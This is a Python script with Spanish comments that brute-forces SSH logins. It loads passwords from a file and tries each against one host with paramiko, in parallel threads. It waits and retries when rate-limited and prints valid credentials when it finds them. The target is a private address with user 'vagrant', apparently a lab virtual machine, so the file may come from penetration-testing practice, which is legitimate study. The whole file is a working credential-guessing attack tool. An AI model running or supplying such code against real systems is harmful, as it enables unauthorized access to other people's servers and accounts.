import paramiko
import socket
import time
from colorama import init, Fore
import concurrent.futures

# Inicializar colorama
init()

class SSHConnector:
    """Clase para manejar conexiones SSH.

    Atributos:
        VERDE (str): Color verde para mensajes de éxito.
        ROJO (str): Color rojo para mensajes de error.
        RESET (str): Reset de color para mensajes.
        AZUL (str): Color azul para mensajes informativos.
        hostname (str): Dirección del host.
        username (str): Nombre de usuario para la conexión SSH.
        client (paramiko.SSHClient): Cliente SSH.
    """

    VERDE = Fore.GREEN
    ROJO = Fore.RED
    RESET = Fore.RESET
    AZUL = Fore.BLUE

    def __init__(self, hostname: str, username: str):
        """
        Inicializa una instancia de SSHConnector.

        Args:
            hostname (str): Dirección del host.
            username (str): Nombre de usuario para la conexión SSH.
        """
        self.hostname = hostname
        self.username = username
        self.client = None

    def conectar(self, password: str) -> bool:
        """Intenta conectar a un host SSH con las credenciales proporcionadas.

        Args:
            password (str): Contraseña para la conexión SSH.

        Returns:
            bool: True si la conexión es exitosa, False en caso contrario.
        """
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            self.client.connect(
                hostname=self.hostname, 
                username=self.username, 
                password=password, 
                timeout=3
            )
        except socket.timeout:
            print(f"{self.ROJO}[!] Host: {self.hostname} no es alcanzable, tiempo de espera agotado. {self.RESET}")
            return False
        except paramiko.AuthenticationException:
            print(f"{self.ROJO}[!] Credenciales inválidas para {self.username}:{password}{self.RESET}")
            return False
        except paramiko.SSHException:
            print(f"{self.AZUL}[*] Cuota excedida, reintentando con retraso...{self.RESET}")
            time.sleep(60)
            return self.conectar(password)
        else:
            print(f"{self.VERDE}[+] Conexión exitosa con:\n\tHOSTNAME: {self.hostname}\n\tUSERNAME: {self.username}\n\tPASSWORD: {password}{self.RESET}")
            return True
        finally:
            if self.client:
                self.client.close()

    def test_password(self, password_file: str):
        """Prueba múltiples contraseñas para la conexión SSH usando un archivo de contraseñas.

        Args:
            password_file (str): Ruta al archivo de texto que contiene las contraseñas.
        """
        with open(password_file, 'r') as archivo:
            passwords = [line.strip() for line in archivo.readlines()]

        # Ejecución en paralelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            futures = [executor.submit(self.conectar, password) for password in passwords]
            for future in concurrent.futures.as_completed(futures):
                future.result()

if __name__ == "__main__":
    hostname = "192.168.138.130"
    username = "vagrant"
    password_file = "passwords.txt"
    connector = SSHConnector(hostname, username)
    connector.test_password(password_file)